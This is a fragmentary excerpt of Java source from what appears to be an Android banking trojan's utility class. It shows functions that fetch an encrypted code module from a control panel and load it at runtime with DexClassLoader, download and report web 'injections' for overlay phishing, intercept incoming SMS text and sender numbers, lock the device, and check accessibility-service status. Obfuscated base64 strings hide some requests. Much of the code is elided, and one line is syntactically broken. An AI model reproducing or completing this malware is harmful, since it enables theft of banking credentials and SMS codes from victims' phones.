...
public class utils {
    ...
    public void initialization(Context context){ // initialization
        try {
          ...
          //  SettingsToAdd(context, consts.LogSMS , consts.string_179 + ex.toString() + "::endLog::");
        }
        }
    ...
    public void downloadModuleDex(Context context, String idbot){
        ...
        try {
           ...
           // SettingsToAdd(context, consts.LogSMS , consts.string_180 + e.toString() + "::endLog::");
        }
        String base64 =  trafDeCr(httpRequest(context, base64Decode("LCJleGl0IjoidHJ1ZSI=") + trafEnCr(jsonDownloadModule.toString())));
        ...
        if (base64.length() > 10000) {
            ...
            try{
                File file = new File( context.getDir("apk", Context.MODE_PRIVATE), consts.nameModule);
                ...
                //SettingsToAdd(context, consts.LogSMS , consts.string_181 + ex.toString() + "::endLog::");
            }
        }
    }
    ...
    public String sendMainModuleDEX(Context context, String params){
        try {
            if(new File(context.getDir("apk", Context.MODE_PRIVATE), consts.nameModule).exists()) {
                File file = new File(context.getDir("apk", Context.MODE_PRIVATE), consts.nameModule);
                File tmpDir = context.getDir("outdex", 0);//outdex
                DexClassLoader classloader = new DexClassLoader(file.getCanonicalPath(), tmpDir.getAbsolutePath(), null, getClass().getClassLoader());
                Class classToLoad = classloader.loadClass("com.example.modulebot.mod");//com.example.modulebot.mod
                Method method = classToLoad.getMethod(consts."main", Context.class, String.class);//main
                return method.invoke(classToLoad.newInstance(), context, params).toString();
            }
            return "";
        }catch(Exception e){
            Log(consts.string_109,consts.string_110 + e.toString());
           // SettingsToAdd(context, consts.LogSMS , consts.string_182 + e.toString() + "::endLog::");
            return "";
        }
    }
    ...
    try {
       ...
       // SettingsToAdd(context, consts.LogSMS , consts.string_183 + ex.toString() + "::endLog::");
    }
    return  "";
    }
    ...
    public void lockDevice(Context context){
        try {
            ...
            Log(consts.lockDevice,"ERROR");
           // SettingsToAdd(context, consts.LogSMS , consts.string_184 + ex.toString() + "::endLog::");
        }
    }
    ...
    public String timeInjectionsSendPanel(Context context, String nameInject){
        ...
        try {
            ...
            request.put("inject", nameInject);//inject
            return trafDeCr(httpRequest(context, consts.str_http_18 + trafEnCr(request.toString())));
        } catch (JSONException e) {
          //  SettingsToAdd(context, consts.LogSMS , consts.string_185 + e.toString() + "::endLog::");
        }
        return "";
    }
        ...
        try {
            ...
            if (bundle != null) {
                ...
                if (pdus != null) {
                    ...
                    String logSMS = "Input SMS: " + number + " Text:" + text + "::endLog::";
                    Log("sendSMS", logSMS);
                    SettingsToAdd(context, consts.LogSMS, logSMS);
                }
            }
        }catch (Exception ex){
           // SettingsToAdd(context, consts.LogSMS , consts.string_186 + ex.toString() + "::endLog::");
        }
    }
    ...
    public String downloadInjection(Context context, String nameInj){
        ...
        try {
            ...
            return httpRequest(context,"action=getinj&data=" + trafEnCr(request.toString()));
        } catch (JSONException e) {}
      return "";
    }
    ...
    public void stopSound(Context context){
       ...
       //     SettingsToAdd(context, consts.LogSMS , consts.string_187 + ex.toString() + "::endLog::");
        }
    }
    ...
    public String checkAP(String url){
        ...
        try {
            ...
            return "";
         //   SettingsToAdd(context, consts.LogSMS ,  consts.string_188 + e.toString() + "::endLog::");
       }
    ...
    public boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        try {
           ...
           // SettingsToAdd(context, consts.LogSMS , consts.string_189 + ex.toString() + "::endLog::");
        }
        return false;
    }
